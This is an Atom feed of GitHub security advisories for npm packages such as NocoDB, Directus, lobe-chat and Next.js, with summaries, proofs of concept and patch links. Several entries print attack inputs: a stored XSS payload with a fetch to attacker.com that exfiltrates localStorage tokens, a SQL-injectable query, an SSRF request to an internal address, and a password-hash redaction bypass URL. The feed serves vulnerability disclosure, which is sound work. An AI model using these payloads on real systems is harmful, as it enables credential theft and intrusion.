<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-05-14T02:10:48.373Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[directus] Directus Lacks Session Tokens Invalidation]]></title>
        <id>https://github.com/advisories/GHSA-g65h-35f3-x2w3</id>
        <link href="https://github.com/advisories/GHSA-g65h-35f3-x2w3"/>
        <updated>2024-05-13T19:59:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Currently session tokens function like the other JWT tokens where they are not actually invalidated when logging out. The <code>directus_session</code> gets destroyed and the cookie gets deleted but if you captured the cookie value it will still work for the entire expiry time which is set to 1 day by default. Making it effectively a long lived unrevokable stateless token instead of the stateful session token it was meant to be.
When authenticating a session token JWT, Directus should also check whether the associated <code>directus_session</code> both still exists and has not expired (although the token should expire at the same time or before the session) to ensure leaked tokens are not valid indefinitely.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ul>
<li>Copy the current session token from the cookie</li>
<li>Refresh and or log out</li>
<li>Use the saved session token to check if it is still valid</li>
</ul>
<h3 id="impact">Impact</h3>
<p>The lack of proper session expiration may improve the likely success of certain attacks. For example, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Incorrect token invalidation could allow an attacker to use the browser's history to access a Directus instance session previously accessed by the victim.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-g65h-35f3-x2w3">https://github.com/directus/directus/security/advisories/GHSA-g65h-35f3-x2w3</a></li>
<li><a href="https://github.com/directus/directus/commit/a6172f8a6a0f31a6bf4305a090de172ebfb63bcf">https://github.com/directus/directus/commit/a6172f8a6a0f31a6bf4305a090de172ebfb63bcf</a></li>
<li><a href="https://github.com/advisories/GHSA-g65h-35f3-x2w3">https://github.com/advisories/GHSA-g65h-35f3-x2w3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g65h-35f3-x2w3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-13T19:59:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB Vulnerable to Stored Cross-Site Scripting in Formula.vue]]></title>
        <id>https://github.com/advisories/GHSA-h6r4-xvw6-jc5h</id>
        <link href="https://github.com/advisories/GHSA-h6r4-xvw6-jc5h"/>
        <updated>2024-05-13T19:59:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting vulnerability exists within the Formula virtual cell comments functionality.</p>
<h3 id="details">Details</h3>
<p>The nc-gui/components/virtual-cell/Formula.vue displays a v-html tag with the value of "urls" whose contents are processed by the function replaceUrlsWithLink(). This function recognizes the pattern URI::(XXX) and creates a hyperlink tag <a> with href=XXX. However, it leaves all the other contents outside of the pattern URI::(XXX) unchanged, which makes the evil users can create a malicious table with a formula field whose payload is &lt;img src=1 onerror="malicious javascripts"URI::(XXX). The evil users then can share this table with others by enabling public viewing and the victims who open the shared link can be attacked.</a></p><a>
<h3 id="poc">PoC</h3>
<p>Step 1: Attacker login the nocodb and creates a table with two fields, "T" and "F". The type of field "T" is "SingleLineText", and the type of the "F" is "Fomula" with the formula content {T}
Step 2: The attacker sets the contents of T using &lt;img src=1 onerror=alert(localStorage.getItem('nocodb-gui-v2'))URI::(XXX)
Step 3: The attacker clicks the "Share" button and enables public viewing, then copies the shared link and sends it to the victims
Step 4: Any victims who open the shared link in their browsers will see the alert with their confidential tokens stored in localStorage</p>
</a><p><a>The attackers can use the fetch(</a><a href="http://attacker.com/?localStorage.getItem(%27nocodb-gui-v2%27)">http://attacker.com/?localStorage.getItem('nocodb-gui-v2')</a>) to replace the alert and then steal the victims' credentials in their attacker.com website.</p>
<h3 id="impact">Impact</h3>
<p>Stealing the credentials of NocoDB user that clicks the malicious link.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-h6r4-xvw6-jc5h">https://github.com/nocodb/nocodb/security/advisories/GHSA-h6r4-xvw6-jc5h</a></li>
<li><a href="https://github.com/nocodb/nocodb/commit/7f58ce3726dfec71537d8b80474a0f95a48a1574">https://github.com/nocodb/nocodb/commit/7f58ce3726dfec71537d8b80474a0f95a48a1574</a></li>
<li><a href="https://github.com/advisories/GHSA-h6r4-xvw6-jc5h">https://github.com/advisories/GHSA-h6r4-xvw6-jc5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h6r4-xvw6-jc5h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-13T19:59:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus allows redacted data extraction on the API through "alias"]]></title>
        <id>https://github.com/advisories/GHSA-p8v3-m643-4xqx</id>
        <link href="https://github.com/advisories/GHSA-p8v3-m643-4xqx"/>
        <updated>2024-05-13T19:40:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A user with permission to view any collection using redacted hashed fields can get access the raw stored version using the <code>alias</code> functionality on the API.
Normally, these redacted fields will return <code>**********</code> however  if we change the request to <code>?alias[workaround]=redacted</code> we can instead retrieve the plain text value for the field.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ul>
<li>Set up a simple role with read-access to users.</li>
<li>Create a new user with the role from the previous step</li>
<li>Assign a password to the user</li>
</ul>
<p>The easiest way to confirm this vulnerability is by first visiting <code>/users/me</code>. You should be presented with a redacted JSON-object.
Next, visit <code>/users/me?alias[hash]=password</code>. This time, the returned JSON object will included the raw password hash instead of the redacted value.</p>
<h2 id="workaround">Workaround</h2>
<p>This can be avoided by removing permission to view the sensitive fields entirely from users or roles that should not be able to see them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-p8v3-m643-4xqx">https://github.com/directus/directus/security/advisories/GHSA-p8v3-m643-4xqx</a></li>
<li><a href="https://github.com/directus/directus/commit/e70a90c267bea695afce6545174c2b77517d617b">https://github.com/directus/directus/commit/e70a90c267bea695afce6545174c2b77517d617b</a></li>
<li><a href="https://github.com/advisories/GHSA-p8v3-m643-4xqx">https://github.com/advisories/GHSA-p8v3-m643-4xqx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p8v3-m643-4xqx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-13T19:40:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB SQL Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8fxg-mr34-jqr8</id>
        <link href="https://github.com/advisories/GHSA-8fxg-mr34-jqr8"/>
        <updated>2024-05-13T16:47:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<hr>
<p>An authenticated attacker with create access could conduct a SQL Injection attack on MySQL DB using unescaped table_name.</p>
<h3 id="details">Details</h3>
<hr>
<h3 id="sql-injection-vulnerability-occurs-in-vitessclientts">SQL Injection vulnerability occurs in <strong>VitessClient.ts</strong>.</h3>
<pre><code class="language-javascript">async columnList(args: any = {}) {
    const func = this.columnList.name;
    const result = new Result();
    log.api(`${func}:args:`, args);

    try {
      args.databaseName = this.connectionConfig.connection.database;

      const response = await this.sqlClient.raw(
        `select *, table_name as tn from information_schema.columns where table_name = '${args.tn}' ORDER by ordinal_position`,
      );
</code></pre>
<p>The variable <strong>${args.tn}</strong> refers to the table name entered by the user.
A malicious attacker can escape the existing query by including a special character (') in the table name and insert and execute a new arbitrary SQL query.</p>
<h3 id="impact">Impact</h3>
<hr>
<p>This vulnerability may result in leakage of sensitive data in the database.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-8fxg-mr34-jqr8">https://github.com/nocodb/nocodb/security/advisories/GHSA-8fxg-mr34-jqr8</a></li>
<li><a href="https://github.com/advisories/GHSA-8fxg-mr34-jqr8">https://github.com/advisories/GHSA-8fxg-mr34-jqr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8fxg-mr34-jqr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-13T16:46:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB Allows Preview of Files with Dangerous Content]]></title>
        <id>https://github.com/advisories/GHSA-qg73-g3cf-vhhh</id>
        <link href="https://github.com/advisories/GHSA-qg73-g3cf-vhhh"/>
        <updated>2024-05-13T16:46:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<hr>
<p>Attacker can upload a html file with malicious content. If user tries to open that file in browser malicious scripts can be executed leading  Stored XSS(Cross-Site Script) attack.</p>
<h3 id="poc">PoC</h3>
<hr>
<p>NocoDB was configured using the Release Binary <code>Noco-macos-arm64</code>, and nocodb version 0.202.9 (currently the latest version) was used.
binary hash infos: md5(164b727f287af56168bc16fba622d0b4) / sha256(43e8e97f4c5f5330613abe071a359f84e4514b7186f92954b678087c37b7832e)
<img src="https://user-images.githubusercontent.com/86613161/287472673-aeb60a02-2080-429f-8583-9f130ab62779.png" alt="image" width="665"></p>
<h3 id="1-run-the-binary-to-start-the-server-and-access-the-arbitrary-table-dashboard">1. Run the binary to start the server and access the arbitrary table dashboard.</h3>
<img src="https://user-images.githubusercontent.com/86613161/287472852-98b2286e-ad66-45bf-b503-63780619d775.png" alt="image" width="830">

<p>Here, used the default <code>Features</code> table.</p>
<h3 id="2-click--in-the-table-field-header-to-add-an-attachment-field">2. Click <code>+</code> in the table <code>field header</code> to add an <code>attachment</code> field.</h3>
<img src="https://user-images.githubusercontent.com/86613161/287472936-98a67213-a547-4e71-915c-d2a43300530b.png" alt="image" width="1173">

<h3 id="3-click-the-add-files-button-to-select-and-upload-files">3. Click the <code>Add File(s)</code> button to select and upload files.</h3>
<img src="https://user-images.githubusercontent.com/86613161/287473041-0801ff39-e48c-4746-8518-be825bfd5533.png" alt="image" width="1132">

<p>Here, <code>test.html</code> containing <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> was uploaded.</p>
<h3 id="4-check-the-uploaded-file-path">4. Check the uploaded file path.</h3>
<p>&lt;img width="1163" alt="image" src="<a href="https://user-images.githubusercontent.com/86613161/287473337-b1c7c781-2fb5-4bd0-b464-dbd3d4158f04.png">https://user-images.githubusercontent.com/86613161/287473337-b1c7c781-2fb5-4bd0-b464-dbd3d4158f04.png</a>"</p>
<h3 id="5-access-the-uploaded-file-path">5. Access the uploaded file path.</h3>
<img src="https://user-images.githubusercontent.com/86613161/287473278-410f9228-58e3-4ee4-b111-70cdbffa9ed5.png" alt="image" width="1201">

<p>When the file path is accessed, the <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> script statement contained in the file is executed and the server host appears in the alert message.</p>
<h3 id="impact">Impact</h3>
<hr>
<p>This allows remote attacker to execute JavaScript code in the context of the user accessing the vector. An attacker could have used this vulnerability to execute requests in the name of a logged-in user or potentially collect information about the attacked user by displaying a malicious form.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-qg73-g3cf-vhhh">https://github.com/nocodb/nocodb/security/advisories/GHSA-qg73-g3cf-vhhh</a></li>
<li><a href="https://github.com/advisories/GHSA-qg73-g3cf-vhhh">https://github.com/advisories/GHSA-qg73-g3cf-vhhh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qg73-g3cf-vhhh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-13T16:46:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@valtimo/components] @valtimo/components exposes access token to form.io]]></title>
        <id>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</id>
        <link href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r"/>
        <updated>2024-05-13T16:04:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>
<p>This issue is caused by a misconfiguration of the Form.io component.</p>
<h3 id="attack-requirements">Attack requirements</h3>
<p>The following conditions have to be met in order to perform this attack:</p>
<ul>
<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>
<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>
<li>An attacker needs to have network access to the Valtimo API.</li>
<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>
<li><a href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-13T16:04:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@valtimo/components] @valtimo/components exposes access token to form.io]]></title>
        <id>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</id>
        <link href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r"/>
        <updated>2024-05-13T16:04:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>
<p>This issue is caused by a misconfiguration of the Form.io component.</p>
<h3 id="attack-requirements">Attack requirements</h3>
<p>The following conditions have to be met in order to perform this attack:</p>
<ul>
<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>
<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>
<li>An attacker needs to have network access to the Valtimo API.</li>
<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>
<li><a href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-13T16:04:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@valtimo/components] @valtimo/components exposes access token to form.io]]></title>
        <id>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</id>
        <link href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r"/>
        <updated>2024-05-13T16:04:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>
<p>This issue is caused by a misconfiguration of the Form.io component.</p>
<h3 id="attack-requirements">Attack requirements</h3>
<p>The following conditions have to be met in order to perform this attack:</p>
<ul>
<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>
<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>
<li>An attacker needs to have network access to the Valtimo API.</li>
<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>
<li><a href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-13T16:04:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@lobehub/chat] lobe-chat `/api/proxy` endpoint Server-Side Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-mxhq-xw3g-rphc</id>
        <link href="https://github.com/advisories/GHSA-mxhq-xw3g-rphc"/>
        <updated>2024-05-10T15:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The latest version of lobe-chat(by now v0.141.2) has an unauthorized ssrf vulnerability. An attacker can construct malicious requests to cause SSRF without logging in, attack intranet services, and leak sensitive information.</p>
<h3 id="details">Details</h3>
<ul>
<li>visit <a href="https://chat-preview.lobehub.com/settings/agent">https://chat-preview.lobehub.com/settings/agent</a>  </li>
<li>you can attack all internal services by /api/proxy and get the echo in http response :)</li>
</ul>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/c2894c34-7333-4ae1-864c-3b212b95eb21"></p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/dd9ad696-7180-4700-8bff-1171a6a8ac91"></p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/e2b97520-a6d5-4939-8313-46db8a1c4b75"></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-http">POST /api/proxy HTTP/2
Host: xxxxxxxxxxxxxxxxx
Cookie: LOBE_LOCALE=zh-CN; LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined; _ga=GA1.1.86608329.1711346216; _ga_63LP1TV70T=GS1.1.1711346215.1.1.1711346846.0.0.0
Content-Length: 23
Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://chat-preview.lobehub.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://chat-preview.lobehub.com/settings/agent
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7

http://172.23.0.1:8000/
</code></pre>
<h3 id="impact">Impact</h3>
<p>SSRF ,All users will be impacted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc</a></li>
<li><a href="https://github.com/advisories/GHSA-mxhq-xw3g-rphc">https://github.com/advisories/GHSA-mxhq-xw3g-rphc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mxhq-xw3g-rphc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-10T15:29:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thelounge] thelounge may publicly disclose of all usernames/idents via port 113]]></title>
        <id>https://github.com/advisories/GHSA-g49q-jw42-6x85</id>
        <link href="https://github.com/advisories/GHSA-g49q-jw42-6x85"/>
        <updated>2024-05-09T21:31:38.000Z</updated>
        <content type="html"><![CDATA[<p>Per RFC 1413, The unique identifying tuple includes not only the ports, but also the both addresses. Without the addresses, the information becomes both non-unique and public:</p>
<ul>
<li>If multiple connections happen to use the same local port number (which is possible if the addresses differ), the username of the first is returned for all, resulting in the wrong ident for all but the first.</li>
<li>By not checking the connection address, the information becomes public. Because there is only a relatively small number of local ports, and the remote ports are likely to be either 6667 or 6697, it becomes trivial to scan the entire range to get a list of idents.</li>
</ul>
<p>To prevent this from happening, disable identd or upgrade to a non vulnerable version.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thelounge/thelounge/security/advisories/GHSA-g49q-jw42-6x85">https://github.com/thelounge/thelounge/security/advisories/GHSA-g49q-jw42-6x85</a></li>
<li><a href="https://github.com/thelounge/thelounge/pull/4872">https://github.com/thelounge/thelounge/pull/4872</a></li>
<li><a href="https://github.com/advisories/GHSA-g49q-jw42-6x85">https://github.com/advisories/GHSA-g49q-jw42-6x85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g49q-jw42-6x85</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-09T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Server-Side Request Forgery in Server Actions]]></title>
        <id>https://github.com/advisories/GHSA-fr5h-rqp8-mj6g</id>
        <link href="https://github.com/advisories/GHSA-fr5h-rqp8-mj6g"/>
        <updated>2024-05-09T21:18:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Server-Side Request Forgery (SSRF) vulnerability was identified in Next.js Server Actions by security researchers at Assetnote. If the <code>Host</code> header is modified, and the below conditions are also met, an attacker may be able to make requests that appear to be originating from the Next.js application server itself.</p>
<h4 id="prerequisites">Prerequisites</h4>
<ul>
<li>Next.js (<code>&lt;14.1.1</code>) is running in a self-hosted* manner.</li>
<li>The Next.js application makes use of Server Actions.</li>
<li>The Server Action performs a redirect to a relative path which starts with a <code>/</code>.</li>
</ul>
<p>* Many hosting providers (including Vercel) route requests based on the Host header, so we do not believe that this vulnerability affects any Next.js applications where routing is done in this manner.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was patched in <a href="https://github.com/vercel/next.js/pull/62561">#62561</a> and fixed in Next.js <code>14.1.1</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability. We recommend upgrading to Next.js <code>14.1.1</code>.</p>
<h3 id="credit">Credit</h3>
<p>Vercel and the Next.js team thank Assetnote for responsibly disclosing this issue to us, and for working with us to verify the fix. Thanks to:</p>
<p>Adam Kues - Assetnote
Shubham Shah - Assetnote</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g">https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g</a></li>
<li><a href="https://github.com/vercel/next.js/pull/62561">https://github.com/vercel/next.js/pull/62561</a></li>
<li><a href="https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085">https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085</a></li>
<li><a href="https://github.com/advisories/GHSA-fr5h-rqp8-mj6g">https://github.com/advisories/GHSA-fr5h-rqp8-mj6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fr5h-rqp8-mj6g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-09T21:18:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Vulnerable to HTTP Request Smuggling]]></title>
        <id>https://github.com/advisories/GHSA-77r5-gw3j-2mpf</id>
        <link href="https://github.com/advisories/GHSA-77r5-gw3j-2mpf"/>
        <updated>2024-05-09T21:07:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Inconsistent interpretation of a crafted HTTP request meant that requests are treated as both a single request, and two separate requests by Next.js, leading to desynchronized responses. This led to a response queue poisoning vulnerability in the affected Next.js versions.</p>
<p>For a request to be exploitable, the affected route also had to be making use of the <a href="https://nextjs.org/docs/app/api-reference/next-config-js/rewrites">rewrites</a> feature in Next.js.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability is resolved in Next.js <code>13.5.1</code> and newer. This includes Next.js <code>14.x</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability. We recommend that you upgrade to a safe version.</p>
<h3 id="references">References</h3>
<p><a href="https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning">https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-77r5-gw3j-2mpf">https://github.com/vercel/next.js/security/advisories/GHSA-77r5-gw3j-2mpf</a></li>
<li><a href="https://github.com/vercel/next.js/commit/44eba020c615f0d9efe431f84ada67b81576f3f5">https://github.com/vercel/next.js/commit/44eba020c615f0d9efe431f84ada67b81576f3f5</a></li>
<li><a href="https://github.com/vercel/next.js/compare/v13.5.0...v13.5.1">https://github.com/vercel/next.js/compare/v13.5.0...v13.5.1</a></li>
<li><a href="https://github.com/advisories/GHSA-77r5-gw3j-2mpf">https://github.com/advisories/GHSA-77r5-gw3j-2mpf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-77r5-gw3j-2mpf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-09T21:07:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@cyclonedx/cyclonedx-library] @cyclonedx/cyclonedx-library Improper Restriction of XML External Entity Reference vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-38gf-rh2w-gmj7</id>
